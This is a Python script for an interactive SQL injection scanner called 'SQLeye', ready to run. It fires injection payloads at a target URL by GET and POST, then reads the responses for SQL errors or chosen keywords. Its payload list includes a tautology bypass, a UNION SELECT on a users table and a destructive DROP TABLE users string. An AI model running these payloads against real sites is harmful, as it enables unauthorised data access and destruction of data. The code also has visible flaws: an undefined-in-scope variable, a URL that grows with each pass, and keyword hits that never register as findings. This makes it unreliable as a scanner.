import requests
import urllib.parse

def is_vulnerable(test_url, keywords=[], http_methods=["GET"]):
  """Checks for potential SQLi vulnerability based on response status, keywords, and HTTP methods.

  Args:
      test_url (str): The URL constructed with the test payload.
      keywords (list, optional): A list of keywords to check for potential data exposure. Defaults to [].
      http_methods (list, optional): A list of HTTP methods to test (e.g., GET, POST). Defaults to ["GET"].

  Returns:
      bool: True if potential vulnerability is detected, False otherwise.
  """

  for http_method in http_methods:
    # Implement logic for different HTTP methods (GET and POST shown)
    if http_method.upper() == "GET":
      response = requests.get(test_url)
    elif http_method.upper() == "POST":  # Add more methods as needed
      # Implement POST request logic with potential payload injection points (use cautiously!)
      data = {'payload': payload}  # Example payload injection for POST
      response = requests.post(test_url, data=data)  # Send POST request
    else:
      print(f"Unsupported HTTP method: {http_method}")
      continue

    if response.status_code == 200:
      # Check for generic error messages indicating potential issues
      if "error in your SQL syntax" in response.text.lower():
        return True
      # Optionally check for specific keyword presence in a safe manner
      if keywords:
        for keyword in keywords:
          if keyword.lower() in response.text.lower():
            print(f"Potential data exposure detected for keyword: {keyword}. Further investigation needed.")
            break

    else:
      print(f"Unexpected response status code: {response.status_code} for method: {http_method}")

  return False

# User Input Options (enhanced)

print("""
                                  
 ______     ______     __         ______     __  __     ______    
/\  ___\   /\  __ \   /\ \       /\  ___\   /\ \_\ \   /\  ___\   
\ \___  \  \ \ \/\_\  \ \ \____  \ \  __\   \ \____ \  \ \  __\   
 \/\_____\  \ \___\_\  \ \_____\  \ \_____\  \/\_____\  \ \_____\ 
  \/_____/   \/___/_/   \/_____/   \/_____/   \/_____/   \/_____/ 
                                                                  


                                   SQLeye - Web Vulnerability Scanner @Xdoom
""")

user_choice = input("Choose an option for SQLeye:\n"
                    "1: Perform basic SQLi test with GET requests\n"
                    "2: Specify custom keywords for data exposure check\n"
                    "3: Test with different HTTP methods (advanced)\n"
                    "Enter your choice (1, 2, or 3): ")

if user_choice == "1":
  # Set a safe target URL (replace with a controlled testing environment)
  url = "http://example.com/safe_search?query="
  # Define a list of common SQLi test payloads (modify for specific scenarios)
  test_payloads = [
      "' OR 1=1 --",
      "' UNION SELECT * FROM users WHERE 1=1 --",
      "' OR 'x'='x'; DROP TABLE users; --",  # Risky, use with caution
  ]

  # Iterate over each test payload
  for payload in test_payloads:
    test_url = url + urllib.parse.quote(payload)
    if is_vulnerable(test_url):
      print(f"Potential SQL injection vulnerability detected with payload: {payload}")
      break

elif user_choice == "2":
  # Set a safe target URL (replace with a controlled testing environment)
  url = "http://example.com/safe_search?query="
  # Define a list of common SQLi test payload
  # Define a list of common SQLi test payloads (modify for specific scenarios)
  test_payloads = [
      "' OR 1=1 --",
      "' UNION SELECT * FROM users WHERE 1=1 --",
      "' OR 'x'='x'; DROP TABLE users; --",  # Risky, use with caution
  ]

  # Get custom keywords from user
  keywords = input("Enter comma-separated keywords to check for (e.g., username, email): ").split(",")
  keywords = [keyword.strip() for keyword in keywords]  # Remove leading/trailing spaces

  # Iterate over each test payload
  for payload in test_payloads:
    test_url = url + urllib.parse.quote(payload)
    if is_vulnerable(test_url, keywords):
      print("Testing completed.")
      break  # Stop testing after finding potential data exposure

elif user_choice == "3":
  # Advanced option for testing different HTTP methods (use cautiously)
  url = "http://example.com/vulnerable_endpoint"  # Replace with a controlled testing environment
  test_payloads = [
      "' OR 1=1 --",  # Modify payloads for different methods (e.g., form data for POST)
  ]
  http_methods = ["GET", "POST"]  # Add more methods as needed

  # Iterate over each test payload and HTTP method
  for payload in test_payloads:
    for http_method in http_methods:
      test_url = url  # Modify URL for POST requests (e.g., with form data)
      if http_method.upper() == "POST":
        # Implement logic to inject payload into POST request body (careful!)
        data = {'payload': payload}  # Example payload injection for POST
        response = requests.post(test_url, data=data)  # Send POST request
      else:
        test_url += urllib.parse.quote(payload)
        response = requests.get(test_url)

      if is_vulnerable(test_url):
        print(f"Potential SQL injection vulnerability detected with payload: {payload} and method: {http_method}")
        break  # Stop testing after finding a vulnerability

  print("Testing completed.")

print("Thank you for using SQLeye!")  # Added a closing message
